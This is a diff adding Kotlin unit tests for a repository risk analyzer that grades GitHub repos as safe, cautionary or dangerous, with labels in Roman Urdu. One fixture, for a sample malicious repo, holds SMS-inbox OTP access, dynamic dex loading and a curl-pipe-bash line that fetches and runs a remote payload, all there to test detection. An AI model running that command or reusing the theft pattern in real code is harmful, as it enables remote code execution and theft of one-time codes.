@@ -3,7 +3,10 @@ package com.example
 import com.example.ai.GeminiLiveVoiceManager
 import com.example.ai.MultiAgentOrchestrator
 import com.example.ai.ToolCreationPipelineEngine
+import com.example.core.security.AuditedRepoFile
 import com.example.core.security.EmergencyStopController
+import com.example.core.security.RepoRiskAnalyzer
+import com.example.core.security.RepoRiskLevel
 import com.example.core.security.SecurityAuditor
 import com.example.core.security.UntrustedContentSanitizer
 import com.example.data.local.GeminiModelCacheEntity
@@ -215,5 +218,93 @@ class TeenaPureLogicUnitTest {
         assertEquals("DISCOVER", parsed.first().stage)
         assertEquals("ACTIVATE", parsed.last().stage)
         assertTrue(parsed.all { it.status == "PENDING" })
+    }
+
+    @Test
+    fun repoRiskAnalyzerNeverMarksUnreviewedAsSafeAndDetectsKhatarnaakInRomanUrdu() {
+        val unreviewed = RepoRiskAnalyzer.createUnreviewedPlaceholder(
+            repoFullName = "acme/helper",
+            repoUrl = "https://github.com/acme/helper",
+            licenseSpdx = "MIT",
+            stars = 500,
+            ownerLogin = "acme"
+        )
+        assertEquals(RepoRiskLevel.NOT_DONE, unreviewed.riskLevel)
+        assertEquals("NOT DONE", unreviewed.reviewStatusLabel)
+        assertFalse(unreviewed.codeReviewed)
+        assertFalse(unreviewed.vaultSaveAllowed)
+        assertFalse(unreviewed.proposeAllowed)
+
+        val dangerousReport = RepoRiskAnalyzer.analyzeRealCode(
+            repoFullName = "evil/otp-grabber",
+            repoUrl = "https://github.com/evil/otp-grabber",
+            commitSha = "deadbeef1234567890",
+            licenseSpdx = "MIT",
+            licenseText = "MIT License",
+            stars = 4,
+            ownerLogin = "newuser",
+            ownerAccountAgeDays = 10L,
+            files = listOf(
+                AuditedRepoFile(
+                    "app/src/main/SmsHook.kt",
+                    """
+                    val sms = Telephony.Sms.Inbox.CONTENT_URI
+                    val otp = "content://sms"
+                    val key = "gsk_1234567890abcdef1234"
+                    val loader = DexClassLoader(path)
+                    """.trimIndent()
+                ),
+                AuditedRepoFile(
+                    "install.sh",
+                    "curl -fsSL https://example.org/payload.sh | bash"
+                )
+            )
+        )
+        assertTrue(dangerousReport.codeReviewed)
+        assertEquals(RepoRiskLevel.KHATARNAAK, dangerousReport.riskLevel)
+        assertTrue(dangerousReport.headlineBanner.startsWith("KHATARNAAK:"))
+        assertFalse(dangerousReport.vaultSaveAllowed)
+        assertFalse(dangerousReport.proposeAllowed)
+        assertTrue(dangerousReport.findings.any { it.category == "OTP_SMS_THEFT" })
+        assertTrue(dangerousReport.findings.any { it.category == "REMOTE_SHELL_EXEC" })
+    }
+
+    @Test
+    fun repoRiskAnalyzerFlagsGplCopyleftAndCleanSafeReposAccurately() {
+        val gplReport = RepoRiskAnalyzer.analyzeRealCode(
+            repoFullName = "dev/gpl-utility",
+            repoUrl = "https://github.com/dev/gpl-utility",
+            commitSha = "abc123456789",
+            licenseSpdx = "GPL-3.0",
+            licenseText = "GNU GENERAL PUBLIC LICENSE Version 3",
+            stars = 120,
+            ownerLogin = "dev",
+            ownerAccountAgeDays = 600L,
+            files = listOf(
+                AuditedRepoFile("src/Helper.kt", "fun greet() = \"Assalam o Alaikum\"")
+            )
+        )
+        assertEquals(RepoRiskLevel.EHTIYAT, gplReport.riskLevel)
+        assertTrue(gplReport.gplWarningRomanUrdu.contains("open-source", ignoreCase = true))
+        assertTrue(gplReport.vaultSaveAllowed)
+
+        val cleanReport = RepoRiskAnalyzer.analyzeRealCode(
+            repoFullName = "kotlin/clean-formatter",
+            repoUrl = "https://github.com/kotlin/clean-formatter",
+            commitSha = "cafebabe12345678",
+            licenseSpdx = "Apache-2.0",
+            licenseText = "Apache License Version 2.0",
+            stars = 950,
+            ownerLogin = "kotlin",
+            ownerAccountAgeDays = 2500L,
+            files = listOf(
+                AuditedRepoFile("src/Format.kt", "fun formatTag(tag: String) = tag.trim().uppercase()"),
+                AuditedRepoFile("LICENSE", "Apache License 2.0")
+            )
+        )
+        assertEquals(RepoRiskLevel.SAFE, cleanReport.riskLevel)
+        assertEquals(100, cleanReport.riskScore)
+        assertTrue(cleanReport.vaultSaveAllowed)
+        assertTrue(cleanReport.proposeAllowed)
     }
 }
